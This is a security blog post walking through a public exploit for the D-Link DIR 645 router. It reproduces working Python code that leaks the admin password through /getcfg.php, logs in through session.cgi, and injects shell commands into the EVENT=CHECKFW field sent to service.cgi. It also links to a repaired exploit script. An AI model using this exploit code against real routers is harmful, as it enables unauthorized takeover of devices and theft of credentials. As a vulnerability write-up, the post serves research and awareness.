---
title: 'IoT security: CNVD-2018-01084(D-Link DIR 645)'
date: 2018-03-02 18:02:43
tags:
- IoT security
- 2018
---

Today, let’s talk about an exploitation in D-Link DIR 645 which is service.cgi arbitrary code execution vulnerability. This is said to be vulnerable in 615 and 815 as well but to be honest I only found the 645 can be exploited by this. So here is the PoC by Cr0n1c.
https://packetstormsecurity.com/files/145859/dlinkroutersservice-exec.txt

Now, let’s go through the code first so we can see what’s it actually doing.

In the PoC, the first vulnerability is an old one which is CWE-200 and it’s found in 2013. You can find a description here,
https://vuldb.com/?id.7843

So basically this bug is that if we make a request to <b><i>/getcfg.php</i></b> with the arguments as <b><i>SERVICES=DEVICES.ACCOUNT</i></b>, it will return the password of the router. And the corresponding codes in the PoC is:

{% codeblock lang:python %}
def attempt_password_find():
    # Going fishing in DEVICE.ACCOUNT looking for CWE-200 or no password
    data = query_getcfg("DEVICE.ACCOUNT")
    if not data:
        return False
 
    res = re.findall("<password>(.*?)</password>", data)
    if len(res) > 0 and res != "=OoXxGgYy=":
        return res[0]
 
    # Did not find it in first attempt
    data = query_getcfg("WIFI")
    if not data:
        return False
 
    res = re.findall("<key>(.*?)</key>", data)
    if len(res) > 0:
        return res[0]
 
    # All attempts failed, just going to return and wish best of luck!
    return False
{% endcodeblock %}

And I’ve got a router here which is D-Link DIR 645 and let’s try this vulnerability. 

{% asset_img 1.PNG %} 

And we can also get the password with this command line.
 
{% asset_img 2.PNG %} 

To be honest, we can login with the username <b><i>“user”</i></b> with no password on the type of router. So that’s it. Let’s went to the new vulnerability now. The second bug is that we can execute remote command using <b><i>“POST”</i></b> method and in the data part, we need to manipulate our command there. Let’s see the code of this part.

At the first, you need to create a session with the password you get just now.

{% codeblock lang:python %}
def create_session():
    post_content = {"REPORT_METHOD": "xml",
                    "ACTION": "login_plaintext",
                    "USER": "admin",
                    "PASSWD": PASSWORD,
                    "CAPTCHA": ""
                    }

    try:
        r = requests.post(URL + "/session.cgi", data=post_content, headers=HEADER)
    except requests.exceptions.ConnectionError:
        print "Error: Failed to access " + URL + "/session.cgi"
        return False

    if not (r.status_code == 200 and r.reason == "OK"):
        print "Error: Did not recieve a HTTP 200"
        return False

    if not re.search("<RESULT>SUCCESS</RESULT>", r.text):
        print "Error: Did not get a success code"
        return False

    return True
{% endcodeblock %}

After creating the session, you are able to execute the code then. Just manipulate the post_content.

{% codeblock lang:python %}
def send_post(command, print_res=True):
    post_content = "EVENT=CHECKFW%26" + command + "%26"
 
    method = "POST"
 
    if URL.lower().startswith("https"):
        handler = urllib2.HTTPSHandler()
    else:
        handler = urllib2.HTTPHandler()
 
    opener = urllib2.build_opener(handler)
    request = urllib2.Request(URL + "/service.cgi", data=post_content, headers=HEADER)
    request.get_method = lambda: method
 
    try:
        connection = opener.open(request)
    except urllib2.HTTPError:
        print "Error: failed to connect to " + URL + "/service.cgi"
        return False
    except urllib2.HTTPSError:
        print "Error: failed to connect to " + URL + "/service.cgi"
        return False
 
    if not connection.code == 200:
        print "Error: Recieved status code " + str(connection.code)
        return False
 
    attempts = 0
 
    while attempts < 5:
        try:
            data = connection.read()
        except httplib.IncompleteRead:
            attempts += 1
        else:
            break
 
        if attempts == 5:
            print "Error: Chunking failed %d times, bailing." %attempts
            return False
 
    if print_res:
        return parse_results(data)
    else:
        return data
{% endcodeblock %}

Ok, I got a router with this vulnerability and tested it, check this out.

{% asset_img 3.PNG %}

The original PoC has some problems and can't run on my kali. So I fixed it and you can run it with python2.7 . 

Get the code from my github.
https://github.com/samohyes/Exploitation

Any problem, please email me at <b><i>xudong_shao@hotmail.com</i></b>